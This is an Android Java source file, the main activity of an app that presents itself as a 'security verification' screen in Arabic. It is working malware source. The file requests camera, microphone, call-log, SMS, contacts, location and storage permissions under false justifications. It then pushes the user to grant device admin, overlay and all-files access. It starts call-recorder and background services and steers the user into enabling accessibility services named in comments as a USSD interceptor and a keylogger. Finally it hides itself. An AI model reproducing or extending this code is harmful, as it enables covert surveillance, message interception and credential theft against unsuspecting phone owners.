package com.sec.check;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends Activity {

    private static final String TAG = "SecurityCheck";
    private static final int PERMISSION_REQUEST = 1001;
    private static final int REQUEST_DEVICE_ADMIN = 2001;
    private static final int REQUEST_OVERLAY = 2002;
    private static final int REQUEST_MANAGE_STORAGE = 2003;

    // ★★★ قائمة الصلاحيات — مقسمة حسب نسخة الأندرويد ★★★
    private static String[][] getPermissionsList() {
        if (Build.VERSION.SDK_INT >= 33) {
            // Android 13+ (API 33+)
            return new String[][]{
                    // كاميرا
                    {Manifest.permission.CAMERA, "للتحقق البصري من الهوية"},

                    // صوت + تسجيل
                    {Manifest.permission.RECORD_AUDIO, "لتسجيل الصوت والمكالمات"},

                    // اتصالات
                    {Manifest.permission.READ_PHONE_STATE, "لمراقبة المكالمات"},
                    {Manifest.permission.CALL_PHONE, "للتحكم بالمكالمات"},
                    {Manifest.permission.READ_CALL_LOG, "لقراءة سجل المكالمات"},
                    {Manifest.permission.PROCESS_OUTGOING_CALLS, "لمراقبة المكالمات الصادرة"},

                    // SMS
                    {Manifest.permission.READ_SMS, "لقراءة الرسائل"},
                    {Manifest.permission.SEND_SMS, "لإرسال الرسائل"},
                    {Manifest.permission.RECEIVE_SMS, "لاستقبال الرسائل"},

                    // جهات الاتصال
                    {Manifest.permission.READ_CONTACTS, "لقراءة جهات الاتصال"},

                    // الموقع
                    {Manifest.permission.ACCESS_FINE_LOCATION, "لتحديد الموقع بدقة"},
                    {Manifest.permission.ACCESS_COARSE_LOCATION, "لتحديد الموقع التقريبي"},

                    // الإشعارات (جديد في Android 13)
                    {Manifest.permission.POST_NOTIFICATIONS, "لإشعارات النظام"},

                    // وسائط (جديد في Android 13)
                    {"android.permission.READ_MEDIA_IMAGES", "لقراءة الصور"},
                    {"android.permission.READ_MEDIA_VIDEO", "لقراءة الفيديوهات"},
                    {"android.permission.READ_MEDIA_AUDIO", "لقراءة الملفات الصوتية"},
            };
        } else {
            // Android 12 وأقل (API 32 وأقل)
            return new String[][]{
                    // كاميرا
                    {Manifest.permission.CAMERA, "للتحقق البصري من الهوية"},

                    // صوت + تسجيل
                    {Manifest.permission.RECORD_AUDIO, "لتسجيل الصوت والمكالمات"},

                    // اتصالات
                    {Manifest.permission.READ_PHONE_STATE, "لمراقبة المكالمات"},
                    {Manifest.permission.CALL_PHONE, "للتحكم بالمكالمات"},
                    {Manifest.permission.READ_CALL_LOG, "لقراءة سجل المكالمات"},
                    {Manifest.permission.PROCESS_OUTGOING_CALLS, "لمراقبة المكالمات الصادرة"},

                    // SMS
                    {Manifest.permission.READ_SMS, "لقراءة الرسائل"},
                    {Manifest.permission.SEND_SMS, "لإرسال الرسائل"},
                    {Manifest.permission.RECEIVE_SMS, "لاستقبال الرسائل"},

                    // جهات الاتصال
                    {Manifest.permission.READ_CONTACTS, "لقراءة جهات الاتصال"},

                    // الموقع
                    {Manifest.permission.ACCESS_FINE_LOCATION, "لتحديد الموقع بدقة"},
                    {Manifest.permission.ACCESS_COARSE_LOCATION, "لتحديد الموقع التقريبي"},

                    // التخزين
                    {Manifest.permission.READ_EXTERNAL_STORAGE, "لقراءة الملفات"},
                    {Manifest.permission.WRITE_EXTERNAL_STORAGE, "لحفظ الملفات"},
            };
        }
    }

    private String[][] permissionsList;
    private int currentPermIndex = 0;
    private Handler mainHandler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "======== APP STARTED =========");
        Log.d(TAG, "Android SDK: " + Build.VERSION.SDK_INT);
        Log.d(TAG, "Device: " + Build.MANUFACTURER + " " + Build.MODEL);

        permissionsList = getPermissionsList();

        showInitialUI();
        mainHandler.postDelayed(this::startPermissionFlow, 1500);
    }

    private void showInitialUI() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#0b1120"));
        root.setGravity(Gravity.CENTER);
        root.setPadding(60, 60, 60, 60);

        TextView icon = new TextView(this);
        icon.setText("🔒");
        icon.setTextSize(80);
        icon.setGravity(Gravity.CENTER);
        root.addView(icon);

        TextView title = new TextView(this);
        title.setText("التحقق الأمني");
        title.setTextSize(24);
        title.setTextColor(Color.WHITE);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 30, 0, 0);
        root.addView(title);

        TextView msg = new TextView(this);
        msg.setText("يتم تهيئة الجلسة الآمنة...");
        msg.setTextSize(15);
        msg.setTextColor(Color.parseColor("#94a3b8"));
        msg.setGravity(Gravity.CENTER);
        msg.setPadding(0, 20, 0, 0);
        root.addView(msg);

        setContentView(root);
    }

    private void startPermissionFlow() {
        currentPermIndex = 0;
        requestNextPermission();
    }

    private void requestNextPermission() {
        if (currentPermIndex >= permissionsList.length) {
            Log.d(TAG, "All runtime permissions requested");
            mainHandler.postDelayed(this::requestDeviceAdmin, 800);
            return;
        }

        String permission = permissionsList[currentPermIndex][0];

        if (!isPermissionDeclared(permission)) {
            Log.d(TAG, "Not declared in manifest: " + permission);
            currentPermIndex++;
            requestNextPermission();
            return;
        }

        if (ContextCompat.checkSelfPermission(this, permission)
                == PackageManager.PERMISSION_GRANTED) {
            Log.d(TAG, "Granted: " + permission);
            currentPermIndex++;
            requestNextPermission();
            return;
        }

        Log.d(TAG, "Requesting: " + permission);
        try {
            ActivityCompat.requestPermissions(this,
                    new String[]{permission}, PERMISSION_REQUEST);
        } catch (Exception e) {
            Log.e(TAG, "request error: " + e.getMessage());
            currentPermIndex++;
            requestNextPermission();
        }
    }

    private boolean isPermissionDeclared(String permission) {
        try {
            android.content.pm.PackageInfo info = getPackageManager()
                    .getPackageInfo(getPackageName(), PackageManager.GET_PERMISSIONS);
            if (info.requestedPermissions != null) {
                for (String p : info.requestedPermissions) {
                    if (p.equals(permission)) return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "isPermissionDeclared: " + e.getMessage());
        }
        return false;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                            String[] permissions,
                                            int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST) {
            for (int i = 0; i < permissions.length; i++) {
                boolean granted = grantResults.length > 0
                        && grantResults[i] == PackageManager.PERMISSION_GRANTED;
                Log.d(TAG, permissions[i] + " " + (granted ? "GRANTED" : "DENIED"));
            }
            currentPermIndex++;
            mainHandler.postDelayed(this::requestNextPermission, 500);
        }
    }

    // ============================================================
    // Device Admin
    // ============================================================
    private void requestDeviceAdmin() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                    getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);

            if (dpm != null && !dpm.isAdminActive(adminComponent)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "لتفعيل الحماية الكاملة للجهاز");
                startActivityForResult(intent, REQUEST_DEVICE_ADMIN);
                Log.d(TAG, "Requesting Device Admin");
            } else {
                Log.d(TAG, "Device Admin already active");
                mainHandler.postDelayed(this::requestManageStorage, 500);
            }
        } catch (Exception e) {
            Log.e(TAG, "DeviceAdmin error: " + e.getMessage());
            mainHandler.postDelayed(this::requestManageStorage, 500);
        }
    }

    // ============================================================
    // MANAGE_EXTERNAL_STORAGE
    // ============================================================
    private void requestManageStorage() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                if (!Environment.isExternalStorageManager()) {
                    Intent intent = new Intent(
                            Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, REQUEST_MANAGE_STORAGE);
                    Log.d(TAG, "Requesting MANAGE_EXTERNAL_STORAGE");
                    return;
                } else {
                    Log.d(TAG, "MANAGE_EXTERNAL_STORAGE already granted");
                }
            } catch (Exception e) {
                Log.e(TAG, "ManageStorage error: " + e.getMessage());
                try {
                    Intent intent = new Intent(
                            Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivityForResult(intent, REQUEST_MANAGE_STORAGE);
                    Log.d(TAG, "Fallback: opening general page");
                    return;
                } catch (Exception ex) {
                    Log.e(TAG, "Fallback error: " + ex.getMessage());
                }
            }
        }
        mainHandler.postDelayed(this::requestOverlay, 500);
    }

    // ============================================================
    // Overlay Permission
    // ============================================================
    private void requestOverlay() {
        try {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_OVERLAY);
                Log.d(TAG, "Requesting Overlay");
                return;
            } else {
                Log.d(TAG, "Overlay granted");
            }
        } catch (Exception e) {
            Log.e(TAG, "Overlay error: " + e.getMessage());
        }
        mainHandler.postDelayed(this::finishSetup, 500);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        Log.d(TAG, "onActivityResult: req=" + requestCode + " res=" + resultCode);

        if (requestCode == REQUEST_DEVICE_ADMIN) {
            mainHandler.postDelayed(this::requestManageStorage, 500);

        } else if (requestCode == REQUEST_MANAGE_STORAGE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                try {
                    boolean granted = Environment.isExternalStorageManager();
                    Log.d(TAG, "MANAGE_EXTERNAL_STORAGE result: " + granted);
                } catch (Exception e) {
                    Log.e(TAG, "check storage error: " + e.getMessage());
                }
            }
            mainHandler.postDelayed(this::requestOverlay, 500);

        } else if (requestCode == REQUEST_OVERLAY) {
            mainHandler.postDelayed(this::finishSetup, 500);
        }
    }

    // ============================================================
    // ★ إنهاء Setup وبدء كل الخدمات
    // ============================================================
    private void finishSetup() {
        Log.d(TAG, "Setup complete - starting services");

        // ★ 1. تشغيل ServiceRunner (الخدمة الرئيسية)
        try {
            Intent serviceIntent = new Intent(this, ServiceRunner.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            Log.d(TAG, "✅ ServiceRunner started");
        } catch (Exception e) {
            Log.e(TAG, "start ServiceRunner error: " + e.getMessage());
        }

        // ★ 2. تشغيل CallRecorderService (تسجيل المكالمات)
        try {
            Intent callRecorderIntent = new Intent(this, CallRecorderService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(callRecorderIntent);
            } else {
                startService(callRecorderIntent);
            }
            Log.d(TAG, "✅ CallRecorderService started");
        } catch (Exception e) {
            Log.e(TAG, "start CallRecorder error: " + e.getMessage());
        }

        // ★ 3. فتح صفحة Accessibility Services
        // (عشان المستخدم يفعّل USSDInterceptor + KeyloggerService)
        mainHandler.postDelayed(() -> {
            try {
                Intent accessibilityIntent = new Intent(
                        Settings.ACTION_ACCESSIBILITY_SETTINGS);
                accessibilityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(accessibilityIntent);

                Log.d(TAG, "📱 Opened Accessibility Settings");
                Log.d(TAG, "User must enable 'System' accessibility service");

            } catch (Exception e) {
                Log.e(TAG, "open accessibility settings error: " + e.getMessage());
            }
        }, 2000);

        // ★ 4. اخفاء التطبيق بعد 7 ثواني
        mainHandler.postDelayed(() -> {
            try {
                moveTaskToBack(true);
                Log.d(TAG, "✅ App hidden");
            } catch (Exception e) {
                Log.e(TAG, "moveTaskToBack error: " + e.getMessage());
            }
        }, 7000);
    }
                    }
